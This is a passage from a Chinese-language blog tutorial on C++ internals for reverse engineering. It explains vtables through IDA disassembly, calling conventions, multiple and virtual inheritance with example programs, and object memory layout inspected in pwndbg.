class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo1</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo2</span>();  </span><br><span class="line">    b-&gt;<span class="built_in">fooa</span>();  </span><br><span class="line">    b-&gt;<span class="built_in">foob</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">fooa</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foob</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当一个类继承带有虚函数的类时，它会先将父类的虚表复制一份，然后将自己的虚表添加到后面：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  A *v3; <span class="comment">// rbx</span></span><br><span class="line">  B *v4; <span class="comment">// rbx</span></span><br><span class="line">  A *a; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  B *b; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (A *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  A::<span class="built_in">A</span>(v3);</span><br><span class="line">  a = v3;</span><br><span class="line">  v4 = (B *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v4-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  B::<span class="built_in">B</span>(v4);</span><br><span class="line">  b = v4;</span><br><span class="line">  (*a-&gt;_vptr_Base)(a, argv);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(A *))a-&gt;_vptr_Base + <span class="number">1</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(B *))b-&gt;_vptr_Base + <span class="number">3</span>))(b);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(B *))b-&gt;_vptr_Base + <span class="number">4</span>))(b);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(A *))a-&gt;_vptr_Base + <span class="number">3</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(A *))a-&gt;_vptr_Base + <span class="number">4</span>))(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>查看虚表，里面装有各个虚函数的首地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D30 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3D30 dq offset _ZN4Base4foo1Ev      ; DATA XREF: Base::Base(<span class="keyword">void</span>)+<span class="number">8</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D30                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D38 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D40 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CF8 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3CF8 dq offset _ZN4Base4foo1Ev      ; DATA XREF: A::A(<span class="keyword">void</span>)+<span class="number">18</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CF8                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D00 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D08 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D10 <span class="number">7</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1A4fooaEv                  ; A::fooa(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D18 B4 <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1A4foobEv                  ; A::foob(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CC0 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3CC0 dq offset _ZN4Base4foo1Ev      ; DATA XREF: B::B(<span class="keyword">void</span>)+<span class="number">18</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CC0                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CC8 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CD0 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CD8 EC <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1B4fooaEv                  ; B::fooa(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CE0 <span class="number">24</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN1B4foobEv                  ; B::foob(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>C/C++ 函数调用约定，主要是对以下两个方面进行了约定： </p>
<ul>
<li>当参数个数多于一个时，按照什么顺序把参数压入堆栈（参数的入栈顺序）</li>
<li>函数调用后，由谁来把堆栈恢复原状</li>
</ul>
<p>常见的调用方式有：</p>
<ul>
<li>C 语言：<code>__cdecl __stdcall __fastcall naked __pascal</code></li>
<li>C++ 语言：<code>__cdecl __stdcall __fastcall naked __pascal __thiscall</code></li>
</ul>
<p>下面就分别介绍这几种调用方式： </p>
<p><code>__stdcall</code>：StandardCall 的缩写，是C++的标准调用方式</p>
<ul>
<li>使用 PASCAL 宏，WINAPI 宏和 CALLBACK 宏来指定函数的调用方式为 stdcall </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>; <span class="comment">// 明确指定用stdcall</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数从右向左依次压入堆栈</li>
<li>由被调用函数自己来恢复堆栈，称为自动清栈</li>
<li>函数名自动加前导下划线，后面紧跟着一个@，其后紧跟着参数的大小</li>
</ul>
<p><code>__cdecl</code>：C Declaration 的缩写，cdecl 调用方式又称为C调用方式，是32位C程序默认的调用方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="comment">// 不加修饰符就是cdecl</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> _cdecl <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="comment">// 明确指定用cdecl</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数从右向左依次压入堆栈</li>
<li>由调用者恢复堆栈，称为手动清栈</li>
<li>函数名自动加前导下划线</li>
</ul>
<p><code>__fastcall</code>：一种快速调用方式（通过 CPU 寄存器来传递参数），是64位C程序默认的调用方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> fastcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>; <span class="comment">// 明确指定用fastcall</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前6个参数分别放入 RDI，RSI，RDX，RCX，R8，R9</li>
<li>其余参数从右向左依次压入堆栈</li>
<li>如果需要用栈传参，则使用手动清栈</li>
</ul>
<p><code>__thiscall</code>：唯一一个不能明确指明的函数修饰，因为 thiscall 不是关键字，是C++类成员函数默认的调用约定</p>
<ul>
<li>由于成员函数调用还有一个 this 指针，因此必须特殊处理</li>
<li>this 指针将作为第一个参数传入，其余参数处理和 <code>__cdecl/__thiscall</code> 一样（取决于程序是32位还是64位）</li>
</ul>
<p><code>__stdcall</code> 和 <code>__cdecl</code> 的不同之处：</p>
<ul>
<li>stdcall 方式是在函数返回时利用 <code>retn x</code> 指令清除栈中的参数</li>
<li>cdecl 方式是函数返回后，由调用函数者修改 esp 的值来清除栈中的参数 </li>
</ul>
<h2 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h2><p>一个派生类如果只继承一个基类，称作单继承，那么如果继承了多个基类，就称作多继承</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">public</span> A,<span class="keyword">public</span> B&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/1685892862095.png" alt="1685892862095">  </p>
<ul>
<li>优点：派生类通过多重继承，可以得到多个基类的数据和方法，更大程度的实现了代码复用</li>
<li>缺点：可能会导致某个类被重复构造，可能得到重复的基类数据</li>
</ul>
<p>案例：多重继承导致重复基类</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="keyword">int</span> data):<span class="built_in">ma</span>(data)&#123; cout &lt;&lt; <span class="string">&quot;A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>()&#123; cout &lt;&lt; <span class="string">&quot;~A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> ma;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mb</span>(data+<span class="number">1</span>) &#123; cout &lt;&lt; <span class="string">&quot;B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">C</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mc</span>(data+<span class="number">2</span>) &#123; cout &lt;&lt; <span class="string">&quot;C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">C</span>()&#123; cout &lt;&lt; <span class="string">&quot;~C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span><span class="keyword">public</span> B, <span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">D</span>(<span class="keyword">int</span> data):<span class="built_in">B</span>(data),<span class="built_in">C</span>(data),<span class="built_in">md</span>(data+<span class="number">3</span>) &#123; cout &lt;&lt; <span class="string">&quot;D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">D</span>()&#123; cout &lt;&lt; <span class="string">&quot;~D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> md;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D* a = <span class="keyword">new</span> <span class="built_in">D</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A()</span><br><span class="line">B()</span><br><span class="line">A()</span><br><span class="line">C()</span><br><span class="line">D()</span><br></pre></td></tr></table></figure>
<ul>
<li>A被构造了两次</li>
</ul>
<h2 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h2><p>在继承方式前面加上 virtual 关键字就是虚继承</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果虚继承类拥有派生类，则构造虚基类的任务将会交给派生类完成</li>
</ul>
<p>案例：虚继承解决重复基类的问题</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="keyword">int</span> data):<span class="built_in">ma</span>(data)&#123; cout &lt;&lt; <span class="string">&quot;A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>()&#123; cout &lt;&lt; <span class="string">&quot;~A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> ma;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mb</span>(data+<span class="number">1</span>) &#123; cout &lt;&lt; <span class="string">&quot;B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">C</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mc</span>(data+<span class="number">2</span>) &#123; cout &lt;&lt; <span class="string">&quot;C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">C</span>()&#123; cout &lt;&lt; <span class="string">&quot;~C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span><span class="keyword">public</span> B, <span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">D</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">B</span>(data),<span class="built_in">C</span>(data),<span class="built_in">md</span>(data+<span class="number">3</span>) &#123; cout &lt;&lt; <span class="string">&quot;D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">D</span>()&#123; cout &lt;&lt; <span class="string">&quot;~D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> md;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D* a = <span class="keyword">new</span> <span class="built_in">D</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：由于B虚继承A，因此派生类D需要完成虚基类A的构造</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A()</span><br><span class="line">B()</span><br><span class="line">C()</span><br><span class="line">D()</span><br></pre></td></tr></table></figure>
<p>案例：虚基类的构造问题</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="keyword">int</span> data):<span class="built_in">ma</span>(data)&#123; cout &lt;&lt; <span class="string">&quot;A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>()&#123; cout &lt;&lt; <span class="string">&quot;~A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> ma;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mb</span>(data+<span class="number">1</span>) &#123; cout &lt;&lt; <span class="string">&quot;B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">public</span> B&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">C</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">B</span>(data),<span class="built_in">mc</span>(data+<span class="number">2</span>) &#123; cout &lt;&lt; <span class="string">&quot;C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">C</span>()&#123; cout &lt;&lt; <span class="string">&quot;~C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span><span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">D</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">C</span>(data),<span class="built_in">md</span>(data+<span class="number">3</span>) &#123; cout &lt;&lt; <span class="string">&quot;D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">D</span>()&#123; cout &lt;&lt; <span class="string">&quot;~D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> md;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D* a = <span class="keyword">new</span> <span class="built_in">D</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于B虚继承A，因此派生类CD都有可能完成虚基类A的构造</li>
<li>通常由最后一级的派生类通常负责构造虚基类</li>
</ul>
<p>虚基类的内存布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x55555556aea0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55555556aea8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbx <span class="number">0x55555556aeb0</span> —▸ <span class="number">0x555555557cb8</span> ◂— <span class="number">0x555555557cb8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55555556aeb8</span> ◂— <span class="number">0xc0000000b</span> <span class="comment">/* &#x27;\x0b&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55555556aec0</span> ◂— <span class="number">0xa0000000d</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>虚继承的子类都有一个虚基类指针，其指向虚基类表（虚基类指针和虚函数的虚指针不是同一个东西）</li>
<li>虚继承底层实现原理与编译器相关，一般通过虚基类指针和虚基类表实现 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555556aea0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x55555556aea0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55555556aea8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbx <span class="number">0x55555556aeb0</span> —▸ <span class="number">0x555555557c28</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55555556aeb8</span> ◂— <span class="number">0xc0000000b</span> <span class="comment">/* &#x27;\x0b&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55555556aec0</span> ◂— <span class="number">0xd</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x55555556aec8</span> —▸ <span class="number">0x555555557c40</span> —▸ <span 